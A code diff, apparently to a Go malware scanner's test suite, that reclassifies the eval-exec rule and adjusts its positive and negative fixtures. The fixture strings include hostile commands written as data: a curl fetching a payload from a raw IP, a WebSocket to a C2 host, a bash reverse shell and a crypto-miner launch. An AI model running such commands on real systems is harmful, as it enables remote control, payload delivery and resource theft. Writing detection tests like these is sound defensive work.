@@ -51,7 +51,9 @@ var corePositives = []fixture{
 	{"suspicious-network", "beacon.sh", `curl http://185.220.101.5/payload`},
 	{"websocket", "c2.js", `const c = new WebSocket("wss://evil.example");`},
 	{"base64", "dec.py", `payload = base64.b64decode(blob)`},
-	{"eval-exec", "run.py", `os.system("id")`},
+	// eval-exec is a capability now, so the fixture needs a threat to pair
+	// with. socket.gethostbyname trips dns-ops, which remains a threat.
+	{"eval-exec", "run.py", "os.system(\"id\")\nsocket.gethostbyname(payload)"},
 	{"reverse-shell", "shell.sh", `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`},
 	{"crypto-miner", "miner.sh", `./xmrig -o stratum+tcp://pool.example:3333`},
 	{"dangerous-file-ops", "perm.sh", `chmod 777 /usr/local/bin/x`},
@@ -181,6 +183,7 @@ var coreNegatives = []fixture{
 	{"char-codes", "lone.js", `var s = String.fromCharCode(104, 105);`},
 	{"package-manager", "lone.sh", `pip install requests`},
 	{"shady-urls", "README.md", `Check out the demo video: https://bit.ly/3xKpL9q`},
+	{"eval-exec", "lone.py", `os.system("id")`},
 
 	// Agent rules are scoped to agent paths; the same content in ordinary
 	// project files must not fire.
